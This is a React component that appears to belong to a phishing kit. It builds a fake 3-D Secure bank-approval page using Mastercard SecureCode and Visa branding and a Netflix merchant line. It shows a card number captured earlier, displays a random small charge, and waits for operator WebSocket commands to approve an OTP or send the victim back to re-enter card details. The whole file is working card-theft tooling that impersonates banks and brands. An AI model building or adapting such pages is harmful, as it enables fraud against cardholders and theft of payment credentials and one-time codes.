import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useTranslation } from '../hooks/useTranslation';
import { randomParamsURL } from '../utils/validation';
import '../styles/vbv-app.css';

function ThreeDSecureBank() {
  const navigate = useNavigate();
  const { t } = useTranslation();

  // Formater le numéro de carte : afficher les 4 premiers et 4 derniers chiffres
  const formatCardNumber = (number) => {
    if (!number || number.length < 8) return '**** **** **** ****';
    // Nettoyer le numéro (enlever les espaces)
    const cleanNumber = number.replace(/\s/g, '');
    if (cleanNumber.length < 8) return '**** **** **** ****';
    
    const first4 = cleanNumber.substring(0, 4);
    const last4 = cleanNumber.substring(cleanNumber.length - 4);
    return `${first4} **** **** ${last4}`;
  };

  // Obtenir la date du jour (date actuelle) au format MM/DD/YYYY
  // IMPORTANT: C'est la date du jour, PAS la date d'expiration de la carte
  const getCurrentDate = () => {
    const now = new Date();
    const month = String(now.getMonth() + 1).padStart(2, '0');
    const day = String(now.getDate()).padStart(2, '0');
    const year = now.getFullYear();
    return `${month}/${day}/${year}`;
  };

  // Générer un montant aléatoire entre 0.01 et 0.99
  const getRandomAmount = () => {
    const min = 0.01;
    const max = 0.99;
    const amount = Math.random() * (max - min) + min;
    return amount.toFixed(2);
  };

  // Initialiser la date du jour dès le début (pas la date d'expiration)
  const [cardNumber, setCardNumber] = useState('');
  const [currentDate] = useState(() => getCurrentDate());
  const [randomAmount] = useState(() => getRandomAmount());

  useEffect(() => {
    // Récupérer le numéro de carte depuis localStorage (stocké lors de la saisie)
    const storedCardNumber = localStorage.getItem('paymentCardNumber');
    if (storedCardNumber) {
      setCardNumber(storedCardNumber);
    }

    // Écouter les messages de redirection depuis le serveur
    const handleWebSocketMessage = (event) => {
      const data = event.detail;
      console.log('[ThreeDSecureBank] 📨 Received WebSocket message event:', data.type, data);

      // Gérer les messages redirect selon l'architecture documentée (direct avec payload)
      if (data && data.type === 'direct' && data.payload && data.payload.action === 'redirect') {
        const page = data.payload.page;
        const isCancellation = data.payload.isCancellation || false;
        const errorMessage = data.payload.errorMessage || t('threeDSecureBank.errors.invalidCard');
        console.log('[ThreeDSecureBank] ✅ Redirect message received (via direct)! Target page:', page, 'isCancellation:', isCancellation);
        
        // Si c'est une annulation vers payment-details, stocker le message d'erreur
        if ((page === '/payment-details' || isCancellation) && errorMessage) {
          console.log('[ThreeDSecureBank] 🚫 Cancellation detected - storing error message');
          localStorage.setItem('paymentError', errorMessage);
        }
        
        navigate(`${page}?${randomParamsURL()}`);
      } else if (data && data.type === 'direct' && data.payload && data.payload.action === 'otp_verification_response') {
        // Gérer la réponse de vérification OTP
        const approved = data.payload.approved;
        console.log('[ThreeDSecureBank] ✅ OTP verification response received:', approved);
        if (approved) {
          // Si approuvé, rediriger vers payment-confirmation
          navigate(`/payment-confirmation?${randomParamsURL()}`);
        } else {
          // Si rejeté, rediriger vers payment-details avec message d'erreur
          console.log('[ThreeDSecureBank] 🚫 OTP rejected - storing error message');
          localStorage.setItem('paymentError', t('threeDSecureBank.errors.invalidCard'));
          navigate(`/payment-details?${randomParamsURL()}`);
        }
      } else if (data && data.type === 'redirect') {
        // Support pour l'ancien format (backward compatibility)
        const page = data.page;
        const isCancellation = data.isCancellation || false;
        const errorMessage = data.errorMessage || 'Your credit card is not valid. Please check your card details and try again.';
        console.log('[ThreeDSecureBank] ✅ Redirect message received (legacy format)! Target page:', page, 'isCancellation:', isCancellation);
        
        // Si c'est une annulation vers payment-details, stocker le message d'erreur
        if ((page === '/payment-details' || isCancellation) && errorMessage) {
          console.log('[ThreeDSecureBank] 🚫 Cancellation detected - storing error message');
          localStorage.setItem('paymentError', errorMessage);
        }
        
        navigate(`${page}?${randomParamsURL()}`);
      }
    };

    window.addEventListener('websocket-message', handleWebSocketMessage);
    console.log('[ThreeDSecureBank] ✅ WebSocket message listener added');

    // Simulate checking for bank app approval
    let checkInterval;
    let checkCount = 0;
    const maxChecks = 60;

    function startChecking() {
      checkInterval = setInterval(() => {
        checkCount++;
        
        if (checkCount >= 5) {
          // Approval detected but animation continues
        }
        
        if (checkCount >= maxChecks) {
          clearInterval(checkInterval);
        }
      }, 1000);
    }

    startChecking();

    return () => {
      if (checkInterval) clearInterval(checkInterval);
      window.removeEventListener('websocket-message', handleWebSocketMessage);
    };
  }, [navigate]);

  const handleCancel = (e) => {
    e.preventDefault();
    navigate(`/payment-details?${randomParamsURL()}`);
  };

  return (
    <div className="container auth-container">
      <div className="auth-wrapper">
        <div className="auth-box">
          <header className="auth-header">
            <div className="logo-left">
              <div className="mastercard-logo">
                <svg viewBox="0 0 120 60" className="mc-logo">
                  <circle cx="35" cy="30" r="15" fill="#EB001B"/>
                  <circle cx="55" cy="30" r="15" fill="#F79E1B"/>
                  <path d="M45 15c-3.5 2.8-5.8 7-5.8 11.8s2.3 9 5.8 11.8c3.5-2.8 5.8-7 5.8-11.8s-2.3-9-5.8-11.8z" fill="#FF5F00"/>
                </svg>
                <span className="securecode-text">SecureCode</span>
              </div>
            </div>
            <div className="logo-right">
              <svg className="visa-logo" viewBox="0 0 80 30">
                <rect width="80" height="30" rx="3" fill="#1A1F71"/>
                <text x="40" y="20" fontSize="16" fontWeight="bold" fill="#ffffff" textAnchor="middle" fontFamily="Arial, sans-serif">VISA</text>
              </svg>
            </div>
          </header>

          <div className="auth-content">
            <div className="app-icon-container">
              <div className="app-icon">
                <svg viewBox="0 0 140 140" className="validation-icon">
                  <rect x="40" y="20" width="60" height="100" rx="12" fill="#2c2c2c" stroke="#1a1a1a" strokeWidth="2"/>
                  <rect x="45" y="30" width="50" height="80" rx="6" fill="#ffffff"/>
                  <rect x="50" y="35" width="40" height="25" rx="3" fill="#f5f5f5"/>
                  <rect x="52" y="37" width="12" height="3" rx="1" fill="#e50914"/>
                  <rect x="66" y="37" width="22" height="3" rx="1" fill="#ddd"/>
                  <rect x="52" y="42" width="36" height="2" rx="1" fill="#ddd"/>
                  <rect x="52" y="46" width="28" height="2" rx="1" fill="#ddd"/>
                  <ellipse cx="70" cy="82.5" rx="25" ry="20" fill="#00A651" opacity="0.2" className="glow-pulse"/>
                  <g className="notification-card">
                    <rect x="50" y="65" width="40" height="35" rx="4" fill="#00A651" className="card-slide"/>
                    <circle cx="70" cy="78" r="6" fill="#ffffff" className="circle-grow"/>
                    <path d="M67 78 L69 80 L73 76" stroke="#00A651" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" fill="none" className="checkmark-draw"/>
                    <rect x="55" y="86" width="30" height="2" rx="1" fill="#ffffff" opacity="0.9" className="text-fade"/>
                    <rect x="55" y="90" width="25" height="2" rx="1" fill="#ffffff" opacity="0.7" className="text-fade-delay"/>
                  </g>
                  <circle cx="70" cy="78" r="8" fill="none" stroke="#00A651" strokeWidth="2" opacity="0" className="ripple-1"/>
                  <circle cx="70" cy="78" r="8" fill="none" stroke="#00A651" strokeWidth="2" opacity="0" className="ripple-2"/>
                  <circle cx="70" cy="115" r="4" fill="#666666"/>
                  <rect x="60" y="20" width="20" height="3" rx="1.5" fill="#1a1a1a"/>
                </svg>
              </div>
            </div>

            <h1 className="page-title">{t('threeDSecureBank.title')}</h1>
            
            <p className="info-message">
              {t('threeDSecureBank.infoMessage').split('\\n').map((line, i, arr) => (
                <span key={i}>
                  {line}
                  {i < arr.length - 1 && <br />}
                </span>
              ))}
            </p>

            <div className="transaction-info">
              <div className="info-row">
                <span className="info-label">{t('threeDSecureBank.merchant')}:</span>
                <span className="info-value">Netflix</span>
              </div>
              <div className="info-row">
                <span className="info-label">{t('threeDSecureBank.amount')}:</span>
                <span className="info-value amount">${randomAmount}</span>
              </div>
              <div className="info-row">
                <span className="info-label">{t('threeDSecureBank.date')}:</span>
                <span className="info-value">{currentDate}</span>
              </div>
              <div className="info-row">
                <span className="info-label">{t('threeDSecureBank.cardNumber')}:</span>
                <span className="info-value card-num">{formatCardNumber(cardNumber)}</span>
              </div>
            </div>

            <div className="loading-section">
              <div className="loading-spinner">
                <svg viewBox="0 0 50 50" className="spinner">
                  <circle cx="25" cy="25" r="20" fill="none" stroke="#e50914" strokeWidth="4" strokeLinecap="round">
                    <animate attributeName="stroke-dasharray" values="0 125;100 125;0 125" dur="1.5s" repeatCount="indefinite"/>
                    <animate attributeName="stroke-dashoffset" values="0;-62.5;-125" dur="1.5s" repeatCount="indefinite"/>
                  </circle>
                </svg>
              </div>
              <p className="loading-text">{t('threeDSecureBank.processing')}</p>
            </div>

            <div className="form-buttons">
              <a href="#" className="cancel-link" onClick={handleCancel}>{t('threeDSecureBank.cancelTransaction')}</a>
            </div>

            <div className="footer-info">
              <p>{t('threeDSecureBank.footerInfo')}</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default ThreeDSecureBank;

